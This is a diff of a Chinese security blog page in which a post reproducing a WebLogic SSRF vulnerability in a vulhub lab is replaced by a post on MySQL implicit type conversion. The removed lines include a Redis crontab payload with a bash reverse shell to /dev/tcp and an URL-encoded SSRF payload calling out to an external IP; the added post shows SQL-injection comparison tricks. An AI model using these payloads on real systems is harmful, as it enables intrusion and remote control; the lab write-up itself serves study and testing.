@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="漏洞复现,">
+  <meta name="keywords" content="mysql,">
 
 
 
@@ -81,35 +81,20 @@
 
 
 
-<meta name="description" content="这里使用vuhub中的weblogic SSRF漏洞环境 环境下载地址为： https://vulhub.org/ 打开链接http://192.168.11.137:7001/uddiexplorer/，可以发现此页面  访问页面Search Public Registries，发现是用来搜索的页面 http://192.168.11.137:7001/uddiexplorer/SearchPu">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="在小密圈中看到了一个这个问题，忽然发现自己好像也不晓得mysql数据库中有这种特性，遂记录一下 有位老哥提出了这样的问题，查询的时候出现了一个问题，where=1时，如图，只出现id=1的数据;当where=’1’=’’;时查询到除了id=1以外的数据。  下面有几位师傅解答了一下，where id=&amp;#39;1&amp;#39;=&amp;#39;&amp;#39;=where (id=&amp;#39;1&amp;#39;)=&amp;#3">
+<meta name="keywords" content="mysql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="weblogic SSRF漏洞复现">
-<meta property="og:url" content="https://jaychouzzk.github.io/2019/02/24/weblogic SSRF漏洞复现/index.html">
+<meta property="og:title" content="mysql的隐式类型转换">
+<meta property="og:url" content="https://jaychouzzk.github.io/2019/03/24/mysql的隐式类型转换/index.html">
 <meta property="og:site_name" content="Jaychouzzk&#39;s blogs">
-<meta property="og:description" content="这里使用vuhub中的weblogic SSRF漏洞环境 环境下载地址为： https://vulhub.org/ 打开链接http://192.168.11.137:7001/uddiexplorer/，可以发现此页面  访问页面Search Public Registries，发现是用来搜索的页面 http://192.168.11.137:7001/uddiexplorer/SearchPu">
+<meta property="og:description" content="在小密圈中看到了一个这个问题，忽然发现自己好像也不晓得mysql数据库中有这种特性，遂记录一下 有位老哥提出了这样的问题，查询的时候出现了一个问题，where=1时，如图，只出现id=1的数据;当where=’1’=’’;时查询到除了id=1以外的数据。  下面有几位师傅解答了一下，where id=&amp;#39;1&amp;#39;=&amp;#39;&amp;#39;=where (id=&amp;#39;1&amp;#39;)=&amp;#3">
 <meta property="og:locale" content="zh-tw">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-1.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-2.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-3.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-4.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-5.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-6.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-7.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-8.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-9.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-10.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-11.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-12.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-13.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-14.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-15.png">
-<meta property="og:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-16.png">
-<meta property="og:updated_time" content="2019-03-23T21:13:42.795Z">
+<meta property="og:image" content="https://jaychouzzk.github.io/img/mysql-类型转换-1.png">
+<meta property="og:updated_time" content="2019-03-23T19:35:38.077Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="weblogic SSRF漏洞复现">
-<meta name="twitter:description" content="这里使用vuhub中的weblogic SSRF漏洞环境 环境下载地址为： https://vulhub.org/ 打开链接http://192.168.11.137:7001/uddiexplorer/，可以发现此页面  访问页面Search Public Registries，发现是用来搜索的页面 http://192.168.11.137:7001/uddiexplorer/SearchPu">
-<meta name="twitter:image" content="https://jaychouzzk.github.io/img/weblogic%20-SSRF-1.png">
+<meta name="twitter:title" content="mysql的隐式类型转换">
+<meta name="twitter:description" content="在小密圈中看到了一个这个问题，忽然发现自己好像也不晓得mysql数据库中有这种特性，遂记录一下 有位老哥提出了这样的问题，查询的时候出现了一个问题，where=1时，如图，只出现id=1的数据;当where=’1’=’’;时查询到除了id=1以外的数据。  下面有几位师傅解答了一下，where id=&amp;#39;1&amp;#39;=&amp;#39;&amp;#39;=where (id=&amp;#39;1&amp;#39;)=&amp;#3">
+<meta name="twitter:image" content="https://jaychouzzk.github.io/img/mysql-类型转换-1.png">
 
 
 
@@ -139,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="https://jaychouzzk.github.io/2019/02/24/weblogic SSRF漏洞复现/">
+  <link rel="canonical" href="https://jaychouzzk.github.io/2019/03/24/mysql的隐式类型转换/">
 
 
 
 
 
-  <title>weblogic SSRF漏洞复现 | Jaychouzzk's blogs</title>
+  <title>mysql的隐式类型转换 | Jaychouzzk's blogs</title>
   
 
 
@@ -252,7 +237,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/02/24/weblogic SSRF漏洞复现/">
+    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/03/24/mysql的隐式类型转换/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Jaychouzzk">
@@ -269,7 +254,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">weblogic SSRF漏洞复现</h1>
+          <h1 class="post-title" itemprop="name headline">mysql的隐式类型转换</h1>
         
 
         <div class="post-meta">
@@ -281,8 +266,8 @@
               
                 <span class="post-meta-item-text">發表於</span>
               
-              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-02-24T19:24:14+08:00">
-                2019-02-24
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-03-24T02:28:55+08:00">
+                2019-03-24
               </time>
             
 
@@ -319,53 +304,18 @@
       
 
       
-        <p>这里使用vuhub中的weblogic SSRF漏洞环境</p>
-<p>环境下载地址为：</p>
-<pre><code>https://vulhub.org/
-</code></pre><p>打开链接<strong><a href="http://192.168.11.137:7001/uddiexplorer/" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/</a></strong>，可以发现此页面</p>
-<p><img src="/img/weblogic -SSRF-1.png" alt=""></p>
-<p>访问页面<strong>Search Public Registries</strong>，发现是用来搜索的页面</p>
-<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp</a></strong></p>
-<p><img src="/img/weblogic -SSRF-2.png" alt=""></p>
-<p>访问页面<strong>Search Private Registry</strong>，发现需要用户登录才可以进行操作</p>
-<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SearchPrivateRegistries.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SearchPrivateRegistries.jsp</a></strong></p>
-<p><img src="/img/weblogic -SSRF-3.png" alt=""></p>
-<p>访问页面<strong>Publish Private Registry</strong>，发现也需要用户登录才可以进行操作</p>
-<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/PublishToPrivateRegistry.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/PublishToPrivateRegistry.jsp</a></strong></p>
-<p><img src="/img/weblogic -SSRF-4.png" alt=""></p>
-<p>访问页面<strong>Modify Private Registry</strong>，发现也需要用户登录才可以进行操作</p>
-<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/ModifyRegistry.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/ModifyRegistry.jsp</a></strong></p>
-<p><img src="/img/weblogic -SSRF-5.png" alt=""></p>
-<p>访问页面<strong>Setup UDDI Explorer</strong>，发现有一处可以输入url，可以尝试进行ssrf攻击</p>
-<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SetupUDDIExplorer.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SetupUDDIExplorer.jsp</a></strong></p>
-<p><img src="/img/weblogic -SSRF-6.png" alt=""></p>
-<p>漏洞测试：<br>输入<a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a> ，在使用burpsuite抓下包，查看下数据包，可以看到，Response包中的状态码为302，应该是不存在ssrf漏洞</p>
-<p><img src="/img/weblogic -SSRF-7.png" alt=""></p>
-<p>尝试在<strong>Search Public Registries</strong>页面输入，发现返回了一个错误</p>
-<p><strong><a href="http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp" target="_blank" rel="noopener">http://192.168.11.137:7001/uddiexplorer/SearchPublicRegistries.jsp</a></strong></p>
-<p><img src="/img/weblogic -SSRF-8.png" alt=""></p>
-<p>使用burpsuit查看下数据包内容，发现此处的url好像是可以控制的</p>
-<p><img src="/img/weblogic -SSRF-9.png" alt=""></p>
-<p>将端口改为一个存在的端口再继续查看返回结果，可以看到，返回404</p>
-<p><img src="/img/weblogic -SSRF-10.png" alt=""></p>
-<p>将端口改为一个不存在的端口再继续查看返回结果，可以看到，返回not connect</p>
-<p><img src="/img/weblogic -SSRF-11.png" alt=""></p>
-<p>尝试使用dict等协议尝试进行端口扫描，会返回不识别此协议</p>
-<p><img src="/img/weblogic -SSRF-12.png" alt=""></p>
-<p>在虚拟机中使用docker inspect 98f9e676d014 命令来查看内网中redis服务的ip，ip为172.21.0.2</p>
-<p><img src="/img/weblogic -SSRF-13.png" alt=""></p>
-<p>尝试探测内网redis服务，探测成功</p>
-<p><img src="/img/weblogic -SSRF-14.png" alt=""></p>
-<p>尝试进行反弹shell，将以下代码进行url编码</p>
-<pre><code>set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/172.18.0.1/21 0&gt;&amp;1\n\n\n\n&quot; 
-config set dir /etc/ 
-config set dbfilename crontab 
-save
-</code></pre><p>得到payload：</p>
-<pre><code>test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F207.148.101.58%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa
-</code></pre><p><img src="/img/weblogic -SSRF-15.png" alt=""></p>
-<p>成功反弹shell</p>
-<p><img src="/img/weblogic -SSRF-16.png" alt=""></p>
+        <p>在小密圈中看到了一个这个问题，忽然发现自己好像也不晓得mysql数据库中有这种特性，遂记录一下</p>
+<p>有位老哥提出了这样的问题，查询的时候出现了一个问题，where=1时，如图，只出现id=1的数据;当where=’1’=’’;时查询到除了id=1以外的数据。</p>
+<p><img src="/img/mysql-类型转换-1.png" alt=""></p>
+<p>下面有几位师傅解答了一下，<code>where id=&#39;1&#39;=&#39;&#39;</code>=<code>where (id=&#39;1&#39;)=&#39;&#39;</code>，过程应该是，mysql在进行字符串与数字比较时，字符串会被mysql隐式类型转换为浮点数，所以这里<code>&#39;&#39;</code>被转换为了<code>0</code>，最后就是<code>(id=1)=0</code>,输出结果即为id不为1的结果。</p>
+<p>在Freebuf中也看到了类似的操作<a href="https://www.freebuf.com/articles/web/190019.html" target="_blank" rel="noopener">SQL注入常规Fuzz全记录</a></p>
+<p><code>select * from user where name=&#39;admin&#39;+1+&#39;&#39; and passwd=&#39;123456&#39;;(为false) ==&gt;提示用户名错误</code></p>
+<p><code>select * from user where name=&#39;admin&#39;+0+&#39;&#39; and passwd=&#39;123456&#39;;(为true) ==&gt;提示密码错误</code></p>
+<p>于是自己测试了一下,发现了神奇的结果，在进行字符串和数字运算的时候，mysql也会进行隐式类型转换,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &apos;admin&apos;=&apos;admin&apos;+&apos;1&apos;;</span><br><span class="line">+---------------------+</span><br><span class="line">| &apos;admin&apos;=&apos;admin&apos;+&apos;1&apos; |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   0 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set, 2 warnings (0.00 sec)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select &apos;admin&apos;=&apos;admin&apos;+&apos;a&apos;;</span><br><span class="line">+---------------------+</span><br><span class="line">| &apos;admin&apos;=&apos;admin&apos;+&apos;a&apos; |</span><br><span class="line">+---------------------+</span><br><span class="line">|                   1 |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set, 3 warnings (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>隐式类型转换规则:</p>
+<p>·如果一个或两个参数都是NULL，比较的结果是NULL，除了NULL安全的&lt;=&gt;相等比较运算符。对于NULL &lt;=&gt; NULL，结果为true。不需要转换<br>·如果比较操作中的两个参数都是字符串，则将它们作为字符串进行比较。<br>·如果两个参数都是整数，则将它们作为整数进行比较。<br>·如果不与数字进行比较，则将十六进制值视为二进制字符串<br>·如果其中一个参数是十进制值，则比较取决于另一个参数。 如果另一个参数是十进制或整数值，则将参数与十进制值进行比较，如果另一个参数是浮点值，则将参数与浮点值进行比较<br>·如果其中一个参数是TIMESTAMP或DATETIME列，另一个参数是常量，则在执行比较之前将常量转换为时间戳。<br>·在所有其他情况下，参数都是作为浮点数（实数）比较的。</p>
 
       
     </div>
@@ -383,7 +333,7 @@ save
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
+            <a href="/tags/mysql/" rel="tag"># mysql</a>
           
         </div>
       
@@ -396,8 +346,8 @@ save
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/01/20/总结：waf绕过技巧-sql，不完整版待补充/" rel="next" title="总结：waf绕过技巧-sql，不完整版待补充">
-                <i class="fa fa-chevron-left"></i> 总结：waf绕过技巧-sql，不完整版待补充
+              <a href="/2019/03/21/Vultr增加虚拟内存/" rel="next" title="Linux增加虚拟内存">
+                <i class="fa fa-chevron-left"></i> Linux增加虚拟内存
               </a>
             
           </div>
@@ -405,10 +355,6 @@ save
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/03/21/Vultr增加虚拟内存/" rel="prev" title="Linux增加虚拟内存">
-                Linux增加虚拟内存 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
